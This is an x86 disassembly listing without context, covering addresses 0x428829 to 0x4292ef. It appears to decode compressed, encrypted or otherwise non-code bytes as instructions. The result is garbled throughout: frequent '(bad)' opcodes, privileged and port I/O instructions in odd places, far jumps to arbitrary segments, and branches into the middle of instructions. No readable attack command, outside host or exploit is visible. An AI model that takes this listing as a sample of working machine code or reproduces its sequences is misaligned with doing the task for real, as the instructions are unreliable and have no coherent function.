  428829:	lea    esp,[ebx-0x24a440b1]
  42882f:	xlat   BYTE PTR ds:[ebx]
  428830:	jne    0x4287f4
  428832:	ss retf 
  428834:	shr    dl,cl
  428836:	repz mov al,BYTE PTR [edi]
  428839:	cdq    
  42883a:	sub    DWORD PTR [ebp-0x36],esp
  42883d:	jecxz  0x4287d1
  42883f:	add    DWORD PTR [edi-0x3928a77],eax
  428845:	popf   
  428846:	pop    esi
  428847:	push   eax
  428848:	or     al,0x55
  42884a:	clc    
  42884b:	cmovno esi,DWORD PTR [eax+eiz*4-0x58]
  428850:	imul   eax,DWORD PTR [eax],0x4ca7f038
  428856:	mov    edi,0x9bf3e6c7
  42885b:	int3   
  42885c:	cli    
  42885d:	gs mov bh,0xf6
  428860:	(bad)  
  428861:	jecxz  0x42885c
  428863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428864:	cli    
  428865:	xor    BYTE PTR [edx-0x4c83e050],cl
  42886b:	mov    ebx,0x978a5fd3
  428870:	push   0xfffffff9
  428872:	test   DWORD PTR ds:[ebx+0x3],esp
  428876:	push   cs
  428877:	outs   dx,BYTE PTR ds:[esi]
  428878:	aad    0x95
  42887a:	scas   eax,DWORD PTR es:[edi]
  42887b:	fs fs add ebx,ebx
  42887f:	xlat   BYTE PTR ds:[ebx]
  428880:	inc    eax
  428881:	aam    0x9e
  428883:	add    DWORD PTR [eax+0x4164a9ff],esp
  428889:	xor    dl,BYTE PTR cs:[eax+0x31]
  42888d:	dec    ebx
  42888e:	pop    eax
  42888f:	push   cs
  428890:	push   ebx
  428891:	inc    ecx
  428892:	sub    eax,0x89b4172
  428897:	hlt    
  428898:	cs inc esp
  42889a:	cmp    al,0x61
  42889c:	cmp    eax,edi
  42889e:	bnd ret 0xd981
  4288a2:	mov    ebx,0xd3f4f889
  4288a7:	loopne 0x42885f
  4288a9:	push   edi
  4288aa:	fmul   QWORD PTR fs:[eax]
  4288ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4288ae:	sahf   
  4288af:	mov    al,ds:0x49fd474d
  4288b4:	popf   
  4288b5:	stos   DWORD PTR es:[edi],eax
  4288b6:	(bad)  
  4288b7:	push   eax
  4288b8:	jmp    0x42886b
  4288ba:	iret   
  4288bb:	lahf   
  4288bc:	adc    BYTE PTR [ebp+0x870d68],0x0
	...
  428933:	add    BYTE PTR [edx-0x5c0023],bl
  428939:	mov    ds:0x79f8fdde,eax
  42893e:	ja     0x42892a
  428940:	and    bh,dl
  428942:	xor    eax,0x1ae86d0
  428947:	add    ch,dh
  428949:	add    BYTE PTR [eax],al
  42894b:	add    BYTE PTR [edx],bh
  42894d:	and    al,0xd6
  42894f:	jp     0x428974
  428951:	in     al,dx
  428952:	jo     0x428974
  428954:	sub    eax,0x3627acf2
  428959:	and    BYTE PTR [edx-0x1e6181df],bh
  42895f:	mov    al,0x2f
  428961:	(bad)  
  428962:	cld    
  428963:	jns    0x428988
  428965:	into   
  428966:	add    bl,0xeb
  428969:	jo     0x4288ff
  42896b:	out    0xc0,eax
  42896d:	(bad)  
  42896e:	jp     0x42896b
  428970:	mov    dl,0x4e
  428972:	lods   al,BYTE PTR ds:[esi]
  428973:	jmp    DWORD PTR [eax-0x50982979]
  428979:	bound  ecx,QWORD PTR [edx+0x5b]
  42897c:	dec    edx
  42897d:	mov    ds:0x93561969,eax
  428982:	dec    edi
  428983:	sub    ch,0x7e
  428986:	and    eax,DWORD PTR [ecx-0x13]
  428989:	gs mov eax,0xbabc7521
  42898f:	ret    
  428990:	nop
  428991:	jmp    0x89b73b5d
  428996:	sbb    DWORD PTR [eax-0x4b99bba2],eax
  42899c:	cmp    al,0x2a
  42899e:	xor    esp,DWORD PTR [ecx]
  4289a0:	nop
  4289a1:	dec    esp
  4289a2:	jecxz  0x428a19
  4289a4:	xchg   esi,eax
  4289a5:	pop    edi
  4289a6:	jne    0x428969
  4289a8:	and    BYTE PTR [edx-0x65077712],al
  4289ae:	dec    edi
  4289af:	cwde   
  4289b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289b1:	pop    ds
  4289b2:	xchg   esp,eax
  4289b3:	add    al,0x25
  4289b5:	pop    edx
  4289b6:	rol    dh,cl
  4289b8:	mov    edi,0x1132e296
  4289bd:	jns    0x4289e9
  4289bf:	mov    ecx,0xc758ce6a
  4289c5:	xchg   esp,eax
  4289c6:	pop    ecx
  4289c7:	stc    
  4289c8:	xchg   esi,eax
  4289c9:	(bad)  
  4289ca:	mov    dl,0x87
  4289cc:	cmp    BYTE PTR [edi+0x37],bh
  4289cf:	push   ds
  4289d0:	fwait
  4289d1:	inc    ebp
  4289d2:	cmp    BYTE PTR [edi+0x1eff61a2],ch
  4289d8:	div    DWORD PTR [ecx-0x5ce83e8]
  4289de:	mov    cl,0x4f
  4289e0:	call   0x3a476eb7
  4289e5:	push   0x34a54b1e
  4289ea:	mov    al,ds:0xdaca8d11
  4289ef:	jo     0x428a5d
  4289f1:	push   cs
  4289f2:	push   edi
  4289f3:	mov    al,0xec
  4289f5:	imul   ecx,DWORD PTR [ecx],0x5ac49b23
  4289fb:	push   0x15
  4289fd:	repnz sub DWORD PTR [ecx+edx*4-0x6c],0xffffffc1
  428a03:	das    
  428a04:	adc    al,0xd7
  428a06:	std    
  428a07:	fst    DWORD PTR [eax]
  428a09:	fistp  QWORD PTR [esi+eax*1+0xf]
  428a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a0e:	or     BYTE PTR [edi+0x3b],dh
  428a11:	cwde   
  428a12:	sbb    bh,bl
  428a14:	test   DWORD PTR [ebp+0x77],0xf1ae251c
  428a1b:	push   0x36
  428a1d:	jb     0x4289fc
  428a1f:	dec    esp
  428a20:	lods   al,BYTE PTR ds:[esi]
  428a21:	cld    
  428a22:	mov    bl,0x87
  428a24:	mov    eax,0xbf186b3b
  428a29:	mov    cl,0x27
  428a2b:	pop    ebp
  428a2c:	popa   
  428a2d:	std    
  428a2e:	cmp    al,0x62
  428a30:	aaa    
  428a31:	mov    al,0x52
  428a33:	dec    ecx
  428a34:	mov    esp,0x5f2041a8
  428a39:	sub    DWORD PTR ds:0xb85b4a1b,ebx
  428a3f:	psraw  mm0,QWORD PTR [eax]
	...
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x649cf691
  428ac2:	sub    eax,0x1af7b77
  428ac7:	add    ch,dh
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    BYTE PTR [esp+edi*1-0x83bf205],al
  428ad2:	pop    DWORD PTR es:[ecx]
  428ad5:	cmp    esi,0xffffffb0
  428ad8:	test   BYTE PTR [ecx],dl
  428ada:	or     BYTE PTR [eax+0x6eb77146],dh
  428ae0:	rcr    esi,1
  428ae2:	enter  0x1ef7,0x7a
  428ae6:	ret    
  428ae7:	dec    ecx
  428ae8:	aad    0x5e
  428aea:	push   0xfffffffa
  428aec:	out    0x9a,eax
  428aee:	stc    
  428aef:	inc    eax
  428af0:	adc    al,0xad
  428af2:	(bad)  
  428af3:	push   ss
  428af4:	ins    BYTE PTR es:[edi],dx
  428af5:	push   cs
  428af6:	mov    esi,esp
  428af8:	sbb    eax,0x865748a2
  428afd:	xchg   esi,eax
  428afe:	fcompp 
  428b00:	jp     0x428b5d
  428b02:	ss loop 0x428aed
  428b05:	jno    0x428af9
  428b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b08:	pop    edx
  428b09:	pop    DWORD PTR ds:0x238a5025
  428b0f:	pop    edi
  428b10:	jb     0x428af2
  428b12:	mov    DWORD PTR [ebx+edi*2],ebp
  428b15:	cli    
  428b16:	xchg   DWORD PTR [edi+0x644fcab4],esi
  428b1c:	out    dx,eax
  428b1d:	data16 sub BYTE PTR [ecx],0xd9
  428b21:	jecxz  0x428ac4
  428b23:	pop    ebx
  428b24:	add    eax,0xaafcd114
  428b29:	push   eax
  428b2a:	sub    DWORD PTR [ecx+0x73b16abc],esi
  428b30:	jle    0x428ade
  428b32:	ret    
  428b33:	pop    edx
  428b34:	mov    ?,eax
  428b36:	fimul  WORD PTR [ebx]
  428b38:	adc    cl,ah
  428b3a:	sbb    DWORD PTR [edi+0x48],ecx
  428b3d:	inc    esi
  428b3e:	sbb    BYTE PTR [esi-0x65c38fa2],0x2f
  428b45:	loopne 0x428af3
  428b47:	loopne 0x428adc
  428b49:	dec    esi
  428b4a:	pushf  
  428b4b:	or     edx,DWORD PTR [esi+ebp*1-0x319dba1a]
  428b52:	ins    DWORD PTR es:[edi],dx
  428b53:	push   0xffffffcc
  428b55:	xchg   ebx,eax
  428b56:	xchg   BYTE PTR es:[ebx+edi*1],ah
  428b5a:	xchg   edi,eax
  428b5b:	sub    eax,DWORD PTR [ecx+0x24beb495]
  428b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b62:	mov    ebx,DWORD PTR [eax+edx*4-0x2168b41]
  428b69:	sar    DWORD PTR [ebp-0x3b4a9622],cl
  428b6f:	sbb    DWORD PTR [ebx+edx*1+0xe],ecx
  428b73:	jbe    0x428b94
  428b75:	mov    cl,0xa2
  428b77:	jae    0x428b95
  428b79:	cdq    
  428b7a:	jae    0x428b6d
  428b7c:	sar    esi,cl
  428b7e:	adc    eax,0xef6ce4f7
  428b83:	sub    al,0x58
  428b85:	imul   ebx,edx,0x71
  428b88:	sub    DWORD PTR [edi-0x6f2c0792],eax
  428b8e:	mov    ch,0x9
  428b90:	pop    es
  428b91:	mov    eax,0x69da0bb8
  428b96:	in     eax,dx
  428b97:	add    eax,0x8a516fb3
  428b9c:	in     al,0xd7
  428b9e:	mov    dl,BYTE PTR [edi]
  428ba0:	cmp    ecx,DWORD PTR [edx+0x77b4f547]
  428ba6:	mov    esp,0xd2f6099a
  428bab:	sub    DWORD PTR [edi-0x40022936],ebx
  428bb1:	in     al,0xaf
  428bb3:	shl    BYTE PTR [ecx],1
  428bb5:	popf   
  428bb6:	cmp    ah,BYTE PTR [ecx-0x112a9a15]
  428bbc:	fst    QWORD PTR [ebx+0x7d4c76]
	...
  428c32:	add    BYTE PTR [eax],al
  428c34:	mov    ds:0xf343b050,eax
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x3d7a28f
  428c41:	pop    esi
  428c42:	sti    
  428c43:	xchg   edx,eax
  428c44:	jo     0x428bf6
  428c46:	add    DWORD PTR [eax],eax
  428c48:	cmc    
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [esi+0x16],bl
  428c4e:	dec    esp
  428c4f:	xor    eax,DWORD PTR [ebx-0x296d68ca]
  428c55:	popf   
  428c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c58:	cmp    al,0xf5
  428c5a:	mov    ch,0x2c
  428c5c:	fnstsw WORD PTR [ebp+0x62]
  428c5f:	xchg   ebx,eax
  428c60:	jecxz  0x428cd0
  428c62:	pop    es
  428c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c64:	sub    eax,DWORD PTR [eax+0x61f62b78]
  428c6a:	inc    edi
  428c6b:	not    DWORD PTR [esi]
  428c6d:	jnp    0x428c72
  428c6f:	ss das 
  428c71:	fimul  WORD PTR [ecx+0x14454f86]
  428c77:	xchg   esp,eax
  428c78:	cs addr16 mov ebx,0xdc56c2b
  428c7f:	sub    DWORD PTR ds:0x93015941,esi
  428c85:	xchg   esp,eax
  428c86:	and    al,0x6d
  428c88:	loop   0x428ca0
  428c8a:	cmc    
  428c8b:	add    BYTE PTR [edx+0x8],ah
  428c8e:	iret   
  428c8f:	dec    ecx
  428c90:	adc    BYTE PTR [ebx+ecx*1+0x35],0x4b
  428c95:	jmp    0x428ceb
  428c97:	pop    es
  428c98:	mov    esi,0xbf207c47
  428c9d:	dec    eax
  428c9e:	call   DWORD PTR [ebx+0x7bfaeb4d]
  428ca4:	push   cs
  428ca5:	rcr    bl,1
  428ca7:	sbb    DWORD PTR [ecx],esp
  428ca9:	cmp    eax,DWORD PTR [edx-0xf]
  428cac:	into   
  428cad:	and    al,dl
  428caf:	or     dh,dh
  428cb1:	inc    edx
  428cb2:	daa    
  428cb3:	and    dh,ah
  428cb5:	add    bh,BYTE PTR [ecx+0x6a67e174]
  428cbb:	arpl   bx,sp
  428cbd:	and    DWORD PTR [esp+edi*2+0x50dc492d],0xffffff99
  428cc5:	dec    esp
  428cc6:	push   eax
  428cc7:	jnp    0x428c6f
  428cc9:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ccb:	ja     0x428c80
  428ccd:	mov    bl,0x7b
  428ccf:	inc    eax
  428cd0:	popf   
  428cd1:	je     0x428c9f
  428cd3:	mov    ah,0xc4
  428cd5:	xor    ch,al
  428cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cd8:	xchg   bl,al
  428cda:	das    
  428cdb:	es addr16 js 0x428d35
  428cdf:	jl     0x428c8a
  428ce1:	repz inc edi
  428ce3:	test   BYTE PTR [edx],cl
  428ce5:	cwde   
  428ce6:	jno    0x428c8d
  428ce8:	(bad)  
  428ce9:	out    0x5b,eax
  428ceb:	pop    eax
  428cec:	test   eax,0xc83d61cc
  428cf1:	adc    ecx,DWORD PTR [eax+0x6d0ae562]
  428cf7:	jp     0x428d62
  428cf9:	push   ds
  428cfa:	or     al,dh
  428cfc:	push   dx
  428cfe:	icebp  
  428cff:	mov    edi,0x8ce2d8f3
  428d04:	adc    esi,DWORD PTR [edi]
  428d06:	loopne 0x428d50
  428d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d09:	(bad)  
  428d0a:	in     al,dx
  428d0b:	(bad)  
  428d0c:	jg     0x428cb3
  428d0e:	jecxz  0x428d15
  428d10:	jge    0x428d7c
  428d12:	cmc    
  428d13:	lahf   
  428d14:	cmp    eax,0x8ce50f91
  428d19:	mov    DWORD PTR [ecx-0x6e07075c],0x867a5891
  428d23:	or     BYTE PTR [eax+0x1c9ebef7],bh
  428d29:	xor    edx,DWORD PTR [esi+edi*4-0xc496e0]
  428d30:	fwait
  428d31:	push   cs
  428d32:	or     ebx,DWORD PTR [edi+0x27f5d068]
  428d38:	sub    ah,BYTE PTR [esi-0x6]
  428d3b:	in     eax,dx
  428d3c:	mov    ds:0x34267b65,eax
	...
  428db1:	add    BYTE PTR [eax],al
  428db3:	add    BYTE PTR [eax+0x6d3c25f1],bh
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0x596842f5
  428dc4:	gs mov cl,0x1
  428dc7:	add    ch,dh
  428dc9:	add    BYTE PTR [eax],al
  428dcb:	add    bl,bh
  428dcd:	sar    BYTE PTR [eax],1
  428dcf:	fldcw  WORD PTR [edx+0x53]
  428dd2:	test   eax,0x41f418b4
  428dd7:	or     eax,0xff2973dd
  428ddc:	pop    eax
  428ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428dde:	xlat   BYTE PTR ds:[ebx]
  428ddf:	pop    esi
  428de0:	mov    ch,0xf5
  428de2:	adc    al,0xe1
  428de4:	and    ebx,DWORD PTR [eax]
  428de6:	dec    ecx
  428de7:	test   DWORD PTR [ebx],esi
  428de9:	pop    esp
  428dea:	test   eax,0x67686295
  428def:	popa   
  428df0:	lea    ebp,[eax-0x46]
  428df3:	dec    edx
  428df4:	add    al,BYTE PTR [eax-0x26]
  428df7:	popf   
  428df8:	addr16 add eax,0x836d411
  428dfe:	shl    BYTE PTR [ecx+0x27],1
  428e01:	pop    edx
  428e02:	push   edi
  428e03:	xchg   edi,eax
  428e04:	stos   DWORD PTR es:[edi],eax
  428e05:	adc    al,0x1d
  428e07:	cs ret 
  428e09:	(bad)  
  428e0a:	aam    0x5c
  428e0c:	adc    eax,0x344d2aaf
  428e11:	hlt    
  428e12:	pop    edi
  428e13:	not    DWORD PTR [edi+0x455430b2]
  428e19:	(bad)  
  428e1a:	int    0xcb
  428e1c:	dec    esi
  428e1d:	xchg   DWORD PTR [edx-0x70f9582e],ecx
  428e23:	pusha  
  428e24:	inc    eax
  428e25:	xor    bh,BYTE PTR [esi+eiz*1+0x9]
  428e29:	cmp    esi,ebx
  428e2b:	jge    0x428e9c
  428e2d:	sbb    DWORD PTR [eax+0x61fa0497],ebx
  428e33:	pusha  
  428e34:	stc    
  428e35:	mov    ah,BYTE PTR [esi-0x255f8284]
  428e3b:	wrmsr  
  428e3d:	xor    al,0x66
  428e3f:	add    dh,BYTE PTR fs:[ebx+ebp*4-0x4aeb3f0c]
  428e47:	nop
  428e48:	add    ebp,DWORD PTR [ecx+0x5d8391ab]
  428e4e:	stos   DWORD PTR es:[di],eax
  428e50:	sar    ecx,0x2d
  428e53:	loope  0x428deb
  428e55:	mov    ch,0xb8
  428e57:	xchg   edx,eax
  428e58:	add    esp,DWORD PTR [edx+0x1d]
  428e5b:	cli    
  428e5c:	jp     0x428e74
  428e5e:	sub    DWORD PTR es:[ecx+0x43],ebp
  428e62:	test   DWORD PTR ds:0x952600d0,edx
  428e68:	out    dx,al
  428e69:	mov    ah,bh
  428e6b:	push   ecx
  428e6c:	es mov bl,0xc7
  428e6f:	or     eax,esi
  428e71:	or     dx,WORD PTR [eax+0x5d6d33ef]
  428e78:	aas    
  428e79:	xor    BYTE PTR [esi+0x64],dh
  428e7c:	inc    ebp
  428e7d:	jg     0x428e7e
  428e7f:	and    al,0x7c
  428e81:	leave  
  428e82:	jg     0x428ec7
  428e84:	rcr    BYTE PTR [ebx-0x6e],cl
  428e87:	das    
  428e88:	(bad)  
  428e89:	nop
  428e8a:	xchg   edi,eax
  428e8b:	xor    eax,0x4d90989
  428e90:	add    edi,edx
  428e92:	pop    ecx
  428e93:	mov    bl,0xd0
  428e95:	adc    al,0xe1
  428e97:	in     al,dx
  428e98:	xlat   BYTE PTR ds:[ebx]
  428e99:	cmp    al,0x22
  428e9b:	add    al,0xa6
  428e9d:	aas    
  428e9e:	adc    DWORD PTR [eax+eiz*4+0x4e],edx
  428ea2:	es pop ebx
  428ea4:	scas   al,BYTE PTR es:[edi]
  428ea5:	cmp    eax,0x98e8c2d4
  428eaa:	mov    al,0x77
  428eac:	jnp    0x428e51
  428eae:	pop    es
  428eaf:	pop    ds
  428eb0:	adc    eax,edx
  428eb2:	jmp    0xc194da90
  428eb7:	jbe    0x428e87
  428eb9:	jne    0x428ebb
  428ebb:	inc    ebx
  428ebc:	scas   eax,DWORD PTR es:[edi]
  428ebd:	lods   eax,DWORD PTR ds:[esi]
  428ebe:	xchg   ecx,eax
  428ebf:	inc    edi
  428ec0:	hlt    
	...
  428f31:	add    BYTE PTR [eax],al
  428f33:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	sbb    ah,dl
  428f42:	add    eax,edx
  428f44:	pop    edx
  428f45:	mov    dl,0x1
  428f47:	add    ch,dh
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [edx],ah
  428f4d:	mov    edx,0x33eb4466
  428f52:	(bad)  [edx+edx*1+0x5]
  428f56:	dec    esp
  428f57:	daa    
  428f58:	push   ss
  428f59:	pop    ecx
  428f5a:	push   cs
  428f5b:	fimul  WORD PTR [ebx+0x20a3c8d]
  428f61:	mov    esi,0x489e1b36
  428f66:	jmp    0x81e0:0xb00e537b
  428f6d:	sbb    eax,0xe91f200f
  428f72:	inc    ebx
  428f73:	mov    edi,0x254719ed
  428f78:	pop    esp
  428f79:	and    BYTE PTR [edx+esi*1-0xe],dh
  428f7d:	mov    ebx,0xa66cf3d
  428f82:	into   
  428f83:	mov    DWORD PTR [ebx+0x69],ebx
  428f86:	scas   al,BYTE PTR es:[edi]
  428f87:	cmp    dl,BYTE PTR [edi-0x61e065e2]
  428f8d:	xchg   DWORD PTR ss:[ebx],esi
  428f90:	push   ebx
  428f91:	mov    ebx,0x3f309222
  428f96:	jb     0x428fd8
  428f98:	jbe    0x428fdb
  428f9a:	cmp    BYTE PTR [edx+0x7b],bl
  428f9d:	xchg   edx,eax
  428f9e:	mov    bh,0xb2
  428fa0:	shl    BYTE PTR [ebp-0x64d1b3c8],cl
  428fa6:	jg     0x428f93
  428fa8:	mov    dh,0x4c
  428faa:	mov    ds:0x2c5dd2c7,al
  428faf:	jmp    0x6cfd:0x2c012336
  428fb6:	std    
  428fb7:	mov    cl,0xff
  428fb9:	fld    DWORD PTR [eax+0x31e2fc8]
  428fbf:	mov    esi,es
  428fc1:	and    edi,ecx
  428fc3:	call   0x245f8f1
  428fc8:	jae    0x428f87
  428fca:	aad    0x87
  428fcc:	test   eax,0xe1761822
  428fd1:	cs test eax,0x88581c2c
  428fd7:	fidiv  WORD PTR [ecx]
  428fd9:	std    
  428fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fdb:	mov    bl,0x52
  428fdd:	xchg   ecx,eax
  428fde:	dec    esi
  428fe0:	(bad)  
  428fe1:	mov    edx,0x935fc5d4
  428fe6:	cld    
  428fe7:	dec    edx
  428fe8:	(bad)  
  428fe9:	pop    ebx
  428fea:	lods   al,BYTE PTR ds:[esi]
  428feb:	mov    eax,ds:0xc5965adb
  428ff0:	jecxz  0x428f92
  428ff2:	(bad)  
  428ff3:	popf   
  428ff4:	sub    eax,0xe819a3d5
  428ff9:	cmp    bh,BYTE PTR [ebx]
  428ffb:	jno    0x42906d
  428ffd:	push   ecx
  428ffe:	clc    
  428fff:	xchg   BYTE PTR [edx+0x69],cl
  429002:	fs xchg esi,eax
  429004:	dec    ebx
  429005:	shr    al,1
  429007:	retf   
  429008:	push   cs
  429009:	or     dl,BYTE PTR [ecx]
  42900b:	dec    edx
  42900c:	leave  
  42900d:	cmp    eax,DWORD PTR ds:0xcd92e0ac
  429013:	test   eax,edx
  429015:	leave  
  429016:	xchg   edx,eax
  429017:	sub    BYTE PTR [ebx+0x7e2d68e8],dl
  42901d:	pop    edx
  42901e:	sbb    bl,bl
  429020:	push   edi
  429021:	arpl   WORD PTR [eax+eax*8-0x38],dx
  429025:	push   0xf2b2bfa8
  42902a:	shl    BYTE PTR [edi-0x30587f9f],0x25
  429031:	and    bl,BYTE PTR [eax]
  429033:	mov    bh,0x2e
  429035:	xor    al,BYTE PTR [ecx]
  429037:	in     al,0xd2
  429039:	mov    BYTE PTR [ebx],dh
  42903b:	xor    BYTE PTR [esi-0x11],al
  42903e:	xchg   edi,eax
  42903f:	sbb    esi,DWORD PTR [edx+0x0]
	...
  4290b2:	add    BYTE PTR [eax],al
  4290b4:	fucomip st,st(6)
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0xfbb66cf7
  4290c1:	pop    ds
  4290c2:	pop    es
  4290c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4290c4:	dec    edi
  4290c5:	mov    bl,0x1
  4290c7:	add    ch,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    BYTE PTR [eax+0x64],cl
  4290ce:	and    bl,bl
  4290d0:	and    BYTE PTR [ebx+0x51],dl
  4290d3:	push   0xfffffff5
  4290d5:	scas   al,BYTE PTR es:[edi]
  4290d6:	clc    
  4290d7:	repnz cmp BYTE PTR [ebx-0x3520146b],dl
  4290de:	sub    DWORD PTR [edx-0x27],esi
  4290e1:	and    esi,DWORD PTR [ebp-0x2e7b0d2a]
  4290e7:	in     al,dx
  4290e8:	into   
  4290e9:	jae    0x4290ef
  4290eb:	mov    ds:0x9b788e82,al
  4290f0:	mov    ecx,0xf06654fc
  4290f5:	inc    ecx
  4290f6:	test   al,0x1b
  4290f8:	ds enter 0x313e,0x15
  4290fd:	jmp    0x71d95a3d
  429102:	lock test al,0x77
  429105:	xchg   ecx,eax
  429106:	aad    0xd5
  429108:	inc    ebp
  429109:	imul   edx,DWORD PTR [ecx-0x10],0xffffff82
  42910d:	cwde   
  42910e:	in     eax,0xdc
  429110:	into   
  429111:	ins    DWORD PTR es:[edi],dx
  429112:	shr    BYTE PTR [esi],0x3c
  429115:	mov    eax,0x579862e
  42911a:	(bad)  
  42911b:	aas    
  42911c:	inc    ecx
  42911d:	cwde   
  42911e:	les    edi,FWORD PTR [edi+0x66d80184]
  429124:	rcr    BYTE PTR [ebx+ecx*1],1
  429127:	dec    edx
  429128:	add    DWORD PTR ds:0x44f01ca8,0xfffffff7
  42912f:	ja     0x429126
  429131:	mov    ebp,0x68c20c22
  429136:	popa   
  429137:	and    BYTE PTR [eax-0x6b],ch
  42913a:	sti    
  42913b:	add    BYTE PTR [esi],0xd5
  42913e:	in     al,0x7
  429140:	adc    al,0xbc
  429142:	pop    edi
  429143:	push   ds
  429144:	cmp    BYTE PTR ds:0x9aad8b94,ah
  42914a:	pextrw esp,mm2,0x9e
  42914e:	ja     0x42913c
  429150:	icebp  
  429151:	data16 mov bl,BYTE PTR cs:[ebp+0x70]
  429156:	sar    BYTE PTR [edx+0x10],cl
  429159:	adc    dh,dl
  42915b:	xor    al,BYTE PTR [edx-0x80]
  42915e:	stos   DWORD PTR es:[edi],eax
  42915f:	aad    0xd4
  429161:	sbb    edi,DWORD PTR [ebx+esi*2]
  429164:	scas   eax,DWORD PTR es:[edi]
  429165:	inc    sp
  429167:	or     al,0x6a
  429169:	push   0x2812836d
  42916e:	jmp    0x429149
  429170:	repz mov eax,0x13d29aab
  429176:	xor    al,0xd9
  429178:	and    al,BYTE PTR [edi+0x646d86fe]
  42917e:	jmp    0xc7b2e796
  429183:	pop    ss
  429184:	iret   
  429185:	pushf  
  429186:	std    
  429187:	scas   al,BYTE PTR es:[edi]
  429188:	xor    DWORD PTR [edx],ecx
  42918a:	and    ah,BYTE PTR ds:0x7ad91fc2
  429190:	sbb    BYTE PTR [ebp+0x408e9e5a],0x6
  429197:	fbld   TBYTE PTR [ecx-0x55]
  42919a:	xchg   edi,eax
  42919b:	xchg   edx,eax
  42919c:	test   BYTE PTR [edx+0x5164207c],ch
  4291a2:	hlt    
  4291a3:	xor    BYTE PTR [eax],dl
  4291a5:	in     eax,0x4b
  4291a7:	inc    esi
  4291a8:	leave  
  4291a9:	mov    eax,0xacdf3ed7
  4291ae:	pop    edx
  4291af:	or     BYTE PTR [eax+0x2bd3f250],al
  4291b5:	(bad)  
  4291b6:	neg    DWORD PTR [ebp-0x7488a911]
  4291bc:	scas   al,BYTE PTR es:[edi]
  4291bd:	pop    DWORD PTR [ebx+0x19]
  4291c0:	popf   
	...
  429231:	add    BYTE PTR [eax],al
  429233:	add    bh,al
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	adc    dl,0xc7
  429243:	mov    BYTE PTR [esp+esi*4+0x1],0x0
  429248:	cmc    
  429249:	add    BYTE PTR [eax],al
  42924b:	add    BYTE PTR [ecx-0x56],bl
  42924e:	call   0x8bcc:0x192b6b00
  429255:	aaa    
  429256:	pushf  
  429257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429258:	inc    esp
  429259:	inc    esi
  42925a:	repnz pop edi
  42925c:	mov    bl,0xc6
  42925e:	and    DWORD PTR [ebx+0x4d62efcd],edx
  429264:	push   edi
  429265:	or     BYTE PTR [ecx],cl
  429267:	int    0xfe
  429269:	pop    ds
  42926a:	imul   esi,ecx,0xffffffde
  42926d:	aad    0x2b
  42926f:	ja     0x4292d2
  429271:	test   ch,dl
  429273:	popf   
  429274:	mov    bl,0xa4
  429276:	mov    esi,esp
  429278:	inc    esp
  429279:	pushf  
  42927a:	and    DWORD PTR [esp+edi*2],0xffffff8b
  42927e:	(bad)  
  42927f:	mov    ds,WORD PTR [eax]
  429281:	shl    ah,cl
  429283:	push   ds
  429284:	enter  0x79db,0x23
  429288:	aas    
  429289:	imul   ebp,DWORD PTR [ebx-0x70],0x3
  42928d:	test   BYTE PTR [eax-0x46],bh
  429290:	mov    dh,0xa3
  429292:	retf   
  429293:	stc    
  429294:	fisttp DWORD PTR [ebp+eiz*4+0x63]
  429298:	xchg   ebp,eax
  429299:	js     0x4292d3
  42929b:	jecxz  0x4292e5
  42929d:	jp     0x4292e3
  42929f:	out    0x93,eax
  4292a1:	or     eax,DWORD PTR [ebp+0x11623bfc]
  4292a7:	mov    edi,0xa2070548
  4292ac:	mov    al,0xb7
  4292ae:	mov    ss,WORD PTR [edi+0x61489e63]
  4292b4:	fdivr  st(7),st
  4292b6:	lods   al,BYTE PTR ds:[esi]
  4292b7:	dec    edi
  4292b8:	enter  0x6a0f,0x61
  4292bc:	(bad)  
  4292bd:	lods   al,BYTE PTR ds:[esi]
  4292be:	(bad)  
  4292bf:	outs   dx,BYTE PTR ds:[esi]
  4292c0:	mov    esi,0xb927eca7
  4292c5:	add    DWORD PTR [edi-0x1c],esi
  4292c8:	jo     0x4292ec
  4292ca:	inc    edx
  4292cb:	xchg   edx,eax
  4292cc:	hlt    
  4292cd:	xchg   BYTE PTR [ecx+0x678b9334],ah
  4292d3:	aaa    
  4292d4:	daa    
  4292d5:	out    dx,eax
  4292d6:	add    eax,edx
  4292d8:	repz es cmc 
  4292db:	es push es
  4292dd:	in     al,0xb1
  4292df:	iret   
  4292e0:	jmp    0xdfdd:0x96b8e0fe
  4292e7:	in     al,0x91
  4292e9:	inc    ebp
  4292ea:	cmc    
  4292eb:	xchg   ah,cl
  4292ed:	jbe    0x42929e
  4292ef:	lods   eax,DWORD PTR ds:[esi]
